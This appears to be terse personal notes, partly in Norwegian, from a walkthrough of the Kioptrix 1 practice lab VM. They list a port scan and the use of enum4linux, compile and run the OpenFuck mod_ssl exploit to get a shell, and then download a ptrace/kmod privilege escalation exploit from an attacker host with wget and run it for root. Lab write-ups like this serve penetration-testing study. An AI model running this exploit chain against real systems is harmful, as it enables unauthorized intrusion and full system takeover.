## kioptrix 1

22,80,111,139,443,1024

22/tcp   open  ssh         OpenSSH 2.9p2 \(protocol 1.99\)

80/tcp   open  http        Apache httpd 1.3.20 \(\(Unix\) 139/tcp  open  netbios-ssn Samba smbd \(workgroup: MYGROUP\)

443/tcp  open  ssl/https   Apache/1.3.20 \(Unix\)  \(Red-Hat/Linux\) mod\_ssl/2.8.4 OpenSSL/0.9.6b

`enum4linux` Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

searchsploit openfuck

cd /usr/share/exploitdb/platforms/unix/remote

her ligger det mange exploits

[http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/)[openfuck](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/)

gcc -o fuck openfuck.c -lcrypto

0x6b er for redhat linux med apache 1.3.20

./fuck 0x6b 10.0.0.12 443

**shell**

searchsploit kernel 2.4.7 redhat

Linux Kernel 2.2.x / 2.4.x \(RedHat\) - 'ptrace/kmod' Privilege Escalation        \| linux/local/3.c

wget 10.0.0.8/3.c

gcc -o lol 3.c

./lol = **root shell**

